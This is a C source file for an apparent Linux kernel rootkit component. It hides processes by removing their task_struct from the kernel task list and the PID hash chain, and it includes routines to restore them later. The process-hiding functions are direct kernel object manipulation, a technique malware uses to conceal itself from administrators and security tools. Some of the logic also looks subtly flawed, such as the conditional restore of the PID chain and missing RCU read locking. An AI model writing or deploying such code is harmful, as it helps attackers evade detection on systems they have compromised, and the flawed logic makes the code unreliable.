#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/list.h>
#include <linux/mutex.h>
#include <linux/pid.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/rculist.h>
#include "hide_pid.h"

static LIST_HEAD(hidden_pid_list_head);
static DEFINE_MUTEX(pid_list_lock);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 10, 0)
static inline struct hlist_node *get_pid_chain_node(struct task_struct *task)
{
    return &task->pid_links[PIDTYPE_PID];
}
#else
static inline struct hlist_node *get_pid_chain_node(struct task_struct *task)
{
    struct pid_link *link = &task->pids[PIDTYPE_PID];
    return &link->node;
}
#endif

int hide_process(pid_t pid_number)
{
    struct pid_node *new_node = NULL;
    struct task_struct *task = NULL;
    struct hlist_node *pid_chain = NULL;
    struct pid *pid_struct;

    // Input validation
    if (pid_number <= 0)
        return -EINVAL;

    // Find PID structure
    pid_struct = find_vpid(pid_number);
    if (!pid_struct || IS_ERR(pid_struct))
        return -ESRCH;

    task = pid_task(pid_struct, PIDTYPE_PID);
    if (!task)
        return -ESRCH;

    mutex_lock(&pid_list_lock);

    // Check if already hidden
    struct pid_node *entry;
    list_for_each_entry(entry, &hidden_pid_list_head, list) {
        if (entry->pid_number == pid_number) {
            mutex_unlock(&pid_list_lock);
            return -EEXIST;
        }
    }

    // Allocate memory for new node
    new_node = kmalloc(sizeof(struct pid_node), GFP_ATOMIC);
    if (!new_node) {
        mutex_unlock(&pid_list_lock);
        return -ENOMEM;
    }

    // Get pid chain node
    pid_chain = get_pid_chain_node(task);

    // Save original positions
    new_node->task = task;
    new_node->pid_number = pid_number;
    new_node->saved_pid_chain = pid_chain;
    new_node->saved_tasks_prev = task->tasks.prev;
    new_node->saved_tasks_next = task->tasks.next;

    // Remove from task list
    list_del_rcu(&task->tasks);
    INIT_LIST_HEAD(&task->tasks);

    // Remove from PID hash table
    hlist_del_rcu(pid_chain);
    INIT_HLIST_NODE(pid_chain);

    // Add to our hidden list
    list_add_tail(&new_node->list, &hidden_pid_list_head);

    mutex_unlock(&pid_list_lock);

    // Wait for RCU grace period
    synchronize_rcu();
    
    return 0;
}

int restore_process(pid_t pid_number)
{
    struct pid_node *entry = NULL, *next_entry = NULL;
    struct task_struct *task = NULL;
    struct hlist_node *pid_chain = NULL;
    int found = 0;

    if (pid_number <= 0)
        return -EINVAL;

    mutex_lock(&pid_list_lock);

    list_for_each_entry_safe(entry, next_entry, &hidden_pid_list_head, list) {
        if (entry->pid_number == pid_number) {
            task = entry->task;
            pid_chain = entry->saved_pid_chain;

            // Restore to PID hash table
            if (task->thread_pid && task->thread_pid->tasks[PIDTYPE_PID].first) {
                hlist_add_head_rcu(pid_chain, &task->thread_pid->tasks[PIDTYPE_PID]);
            }

            // Restore to task list
            if (entry->saved_tasks_prev && entry->saved_tasks_next) {
                list_add_tail_rcu(&task->tasks, &init_task.tasks);
            }

            // Remove from hidden list and free memory
            list_del(&entry->list);
            kfree(entry);
            found = 1;
            break;
        }
    }

    mutex_unlock(&pid_list_lock);

    if (!found)
        return -ENOENT;

    // Wait for RCU grace period
    synchronize_rcu();
    
    return 0;
}

bool is_process_hidden(pid_t pid_number)
{
    struct pid_node *entry;
    bool found = false;

    mutex_lock(&pid_list_lock);
    
    list_for_each_entry(entry, &hidden_pid_list_head, list) {
        if (entry->pid_number == pid_number) {
            found = true;
            break;
        }
    }
    
    mutex_unlock(&pid_list_lock);
    
    return found;
}

void hide_cleanup(void)
{
    struct pid_node *entry = NULL, *next_entry = NULL;

    mutex_lock(&pid_list_lock);

    // Restore all hidden processes first
    list_for_each_entry_safe(entry, next_entry, &hidden_pid_list_head, list) {
        struct task_struct *task = entry->task;
        struct hlist_node *pid_chain = entry->saved_pid_chain;

        // Restore to PID hash table
        if (task->thread_pid && task->thread_pid->tasks[PIDTYPE_PID].first) {
            hlist_add_head_rcu(pid_chain, &task->thread_pid->tasks[PIDTYPE_PID]);
        }

        // Restore to task list
        list_add_tail_rcu(&task->tasks, &init_task.tasks);

        // Remove from our list
        list_del(&entry->list);
        kfree(entry);
    }

    mutex_unlock(&pid_list_lock);

    // Final RCU sync
    synchronize_rcu();
}
